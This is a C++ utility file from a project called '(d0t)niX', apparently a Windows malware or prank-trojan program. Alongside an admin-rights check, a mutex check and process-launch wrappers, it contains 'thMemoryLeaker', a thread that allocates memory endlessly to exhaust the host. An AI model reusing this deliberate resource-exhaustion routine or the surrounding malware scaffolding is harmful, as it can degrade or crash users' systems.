/*-----------------------------------------------------+------------------------\
 |    ___    __________   __  ___          ______  ___ |  ____ ___   __   __    |
 |   /  / __| _/\   _  \_/  |_\  \   ____ |__\   \/  / | |    |   \_/  |_|  |   |
 |  /  / / __ | /  / \  \   __\\  \ /    \|  |\     /  | |    |   /\   __\  |   |
 | (  ( / /_/ | \  \_/   \  |   )  )   |  \  |/     \  | |    |  /  |  | |  |__ |
 |  \  \\____ |  \_____  /__|  /  /|___|  /__/___/\  \ | |______/   |__| |____/ |
 |   \__\    \/        \/     /__/      \/         \_/ |                        |
 +------------------------------------------------+----+------------------------/
 | Utilities.cpp :: (d0t)niX's Utilitie Functions |
 \------------------------------------------------*/

#include "../../Header-Files/pch.h"
#include "../../Header-Files/(d0t)niX.h"

BOOL fnIsUserAdmin(VOID) {
	SID_IDENTIFIER_AUTHORITY siaSNtA = SECURITY_NT_AUTHORITY;
	PSID psAg;
	BOOL bAais = AllocateAndInitializeSid(&siaSNtA, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &psAg);
	if (bAais) {
		if (!CheckTokenMembership(NULL, psAg, &bAais)) {
			bAais = FALSE;
		}

		FreeSid(psAg);
	}

	return bAais;
}

DWORD WINAPI thMemoryLeaker(
	_In_ LPVOID lpParam
) {
	HANDLE hHeap = HeapCreate(NULL, 0, NULL);
	if (hHeap) {
		for (;;) {
			HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x2000);
			Sleep(100);
		}
	} else {
		fnMessageHandlerW(NULL, L"Couldn't create Heap", L"HeapCreate", MB_ICONERROR);
		return FALSE;
	}
}

#if SYNCHRONIZATION == TRUE
BOOL fnCheckMutexW(
	_In_ LPCWSTR lpName
) {
	if (OpenMutex(SYNCHRONIZE, FALSE, lpName)) {
		return TRUE;
	} else {
		fnMessageHandlerW(NULL, L"Couldn't Open Mutex", L"OpenMutexW", MB_ICONERROR);
		return FALSE;
	}
}
#endif // SYNCHRONIZATION

BOOL fnCreateProcessW(
	_In_ LPCWSTR lpFileName,
	_In_ LPCWSTR lpCommandLine,
	_In_ DWORD   dwCreationFlags,
	_In_ LPCWSTR lpCurrentDirectory
) {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	LPWSTR lpCommandLineC = _wcsdup(lpCommandLine);

	if (CreateProcess(lpFileName, lpCommandLineC, NULL, NULL, FALSE, dwCreationFlags, NULL, lpCurrentDirectory, &si, &pi)) {
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		free(lpCommandLineC);
		return TRUE;
	} else {
		fnMessageHandlerW(NULL, L"Couldn't launch Process\nFile: %s\nCommandLine: %s", L"CreateProcessW", MB_ICONERROR, lpFileName, lpCommandLine);
		free(lpCommandLineC);
		return FALSE;
	}
}

BOOL fnShellExecuteExW(
	_In_opt_ LPCWSTR lpVerb,
	_In_     LPCWSTR lpFile,
	_In_opt_ LPCWSTR lpParameter,
	_In_opt_ LPCWSTR lpDirectory,
	_In_opt_ INT     nShow,
	_In_opt_ LPCWSTR lpClass
) {
	SHELLEXECUTEINFO ei;
	ZeroMemory(&ei, sizeof(ei));
	ei.cbSize = sizeof(ei);

	ei.lpVerb = lpVerb;
	ei.lpFile = lpFile;
	ei.lpParameters = lpParameter;
	ei.lpDirectory = lpDirectory;
	ei.nShow = nShow;
	ei.lpClass = lpClass;

	if (ShellExecuteEx(&ei)) {
		if (ei.hProcess) {
			CloseHandle(ei.hProcess);
		}
		return TRUE;
	} else {
		fnMessageHandlerW(NULL, L"Couldn't launch File\nFile: %s", L"ShellExecuteExW", MB_ICONERROR, lpFile);
		return FALSE;
	}
}